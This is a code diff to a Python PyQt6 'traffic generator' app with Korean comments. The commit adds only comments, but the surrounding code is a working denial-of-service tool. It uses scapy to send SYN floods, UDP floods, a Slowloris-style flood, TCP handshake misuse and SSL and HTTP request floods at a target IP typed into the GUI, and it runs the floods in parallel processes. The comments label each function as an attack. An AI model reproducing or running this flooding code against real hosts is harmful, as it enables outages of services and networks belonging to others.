@@ -1,3 +1,4 @@
+# 필요한 모듈을 임포트.
 from PyQt6.QtWidgets import QWidget, QVBoxLayout, QLabel, QPushButton, QLineEdit, QHBoxLayout, QCheckBox, QMessageBox
 from PyQt6.QtGui import QIcon
 from scapy.all import IP, TCP, UDP, send
@@ -7,6 +8,7 @@ import random
 from multiprocessing import Process, Value
 import subprocess
 
+# SYN 플러드 공격을 수행하는 함수.
 def syn_flood(target_ip, count, stop_flag):
     for _ in range(count):
         if stop_flag.value:
@@ -17,7 +19,7 @@ def syn_flood(target_ip, count, stop_flag):
         packet = IP(dst=target_ip)/TCP(dport=port, flags='S')/("X"*payload_size)
         send(packet, inter=0.0001)
 
-
+# UDP 플러드 공격을 수행하는 함수.
 def udp_flood(target_ip, count, stop_flag):
     for _ in range(count):
         if stop_flag.value:
@@ -28,7 +30,7 @@ def udp_flood(target_ip, count, stop_flag):
         packet = IP(dst=target_ip)/UDP(dport=port)/("X"*payload_size)
         send(packet, inter=0.0001)
 
-
+# HTTP Slowloris 공격을 수행하는 함수
 def http_slowloris(target_ip, count, stop_flag):
     for _ in range(count):
         if stop_flag.value:
@@ -38,7 +40,7 @@ def http_slowloris(target_ip, count, stop_flag):
         packet = IP(dst=target_ip)/TCP(dport=80, flags='PA')/("X"*payload_size)
         send(packet, inter=0.0001)
 
-
+# TCP 핸드셰이크 오용 공격을 수행하는 함수.
 def tcp_handshake_misuse(target_ip, count, stop_flag):
     for _ in range(count):
         if stop_flag.value:
@@ -49,6 +51,7 @@ def tcp_handshake_misuse(target_ip, count, stop_flag):
         packet = IP(dst=target_ip)/TCP(dport=port, flags='S')/("X"*payload_size)
         send(packet, inter=0.0001)
 
+# SSL/TLS 트래픽을 생성하는 함수.
 def ssl_traffic(target_ip, count, stop_flag):
     import ssl
     import socket
@@ -64,7 +67,7 @@ def ssl_traffic(target_ip, count, stop_flag):
                 data = b'GET / HTTP/1.1\r\nHost: ' + target_ip.encode() + b'\r\n' + b'X' * data_size + b'\r\n\r\n'
                 ssock.sendall(data)
 
-
+# HTTP 요청을 변조하는 함수.
 def http_request_modification(target_ip, count, stop_flag):
     import requests
     for _ in range(count):
@@ -76,7 +79,7 @@ def http_request_modification(target_ip, count, stop_flag):
         except requests.exceptions.RequestException:
             pass
 
-
+# 트래픽 생성기 애플리케이션 클래스.
 class TrafficGeneratorApp(QWidget):
     def __init__(self, main_app, parent=None):
         super().__init__(parent)
@@ -84,14 +87,14 @@ class TrafficGeneratorApp(QWidget):
         self.setWindowTitle("트래픽 생성기")
         layout = QVBoxLayout()
 
-        # 뒤로가기 버튼
+        # 뒤로가기 버튼을 설정.
         back_button = QPushButton("")
         back_button.setIcon(QIcon.fromTheme("go-previous"))  # 아이콘 설정
         back_button.setFixedSize(30, 30)  # 다른 어플리케이션과 동일한 크기
         back_button.clicked.connect(self.go_back)  # 뒤로가기 기능 연결
         layout.addWidget(back_button)
 
-        # IP 입력
+        # IP 입력 필드를 설정.
         ip_layout = QHBoxLayout()
         ip_label = QLabel("대상 IP:")
         self.ip_input = QLineEdit()
@@ -99,7 +102,7 @@ class TrafficGeneratorApp(QWidget):
         ip_layout.addWidget(self.ip_input)
         layout.addLayout(ip_layout)
 
-        # 트래픽 유형 선택
+        # 트래픽 유형 선택 체크박스를 설정.
         self.syn_flood_checkbox = QCheckBox("SYN 플러드")
         self.udp_flood_checkbox = QCheckBox("UDP 플러드")
         self.http_slowloris_checkbox = QCheckBox("HTTP Slowloris")
@@ -113,7 +116,7 @@ class TrafficGeneratorApp(QWidget):
         layout.addWidget(self.ssl_traffic_checkbox)
         layout.addWidget(self.http_request_modification_checkbox)
 
-        # 패킷 수 및 속도 입력
+        # 패킷 수 입력 필드를 설정.
         packet_count_layout = QHBoxLayout()
         packet_count_label = QLabel("패킷 수:")
         self.packet_count_input = QLineEdit("10")
@@ -121,26 +124,28 @@ class TrafficGeneratorApp(QWidget):
         packet_count_layout.addWidget(self.packet_count_input)
         layout.addLayout(packet_count_layout)
 
-        # 패킷 생성 버튼
+        # 패킷 생성 버튼을 설정.
         generate_button = QPushButton("패킷 생성 및 전송")
         generate_button.clicked.connect(self.generate_traffic)
         layout.addWidget(generate_button)
 
-        # 전송 중단 버튼
+        # 전송 중단 버튼을 설정.
         stop_button = QPushButton("전송 중단")
         stop_button.clicked.connect(self.stop_transmission)
         layout.addWidget(stop_button)
 
         self.setLayout(layout)
 
-        # 스레드 및 프로세스 추적을 위한 리스트
+        # 스레드 및 프로세스 추적을 위한 리스트를 초기화.
         self.processes = []
         self.stop_flag = Value('b', False)
 
+    # 메인 화면으로 돌아가는 메서드.
     def go_back(self):
         # MainApp의 show_main_screen 메서드를 호출
         self.main_app.show_main_screen()
 
+    # 트래픽을 생성하고 전송하는 메서드.
     def generate_traffic(self):
         self.stop_flag.value = False  # 중단 플래그 초기화
         target_ip = self.ip_input.text().strip()
@@ -176,6 +181,7 @@ class TrafficGeneratorApp(QWidget):
             QMessageBox.warning(self, "잘못된 IP", "올바른 IP 주소를 입력하세요.")
             self.ip_input.clear()
 
+    # IP 주소의 유효성을 검사하는 메서드.
     def is_valid_ip(self, ip):
         # IP 주소 유효성 검사 강화
         try:
@@ -184,10 +190,12 @@ class TrafficGeneratorApp(QWidget):
         except socket.error:
             return False
 
+    # HTTP Slowloris 공격을 구현하는 메서드.
     def slowloris_attack(self, target_ip):
         # HTTP Slowloris 공격 구현
         pass
 
+    # 트래픽 전송을 중단하는 메서드.
     def stop_transmission(self):
         self.stop_flag.value = True  # 중단 플래그 설정
         for process in self.processes:
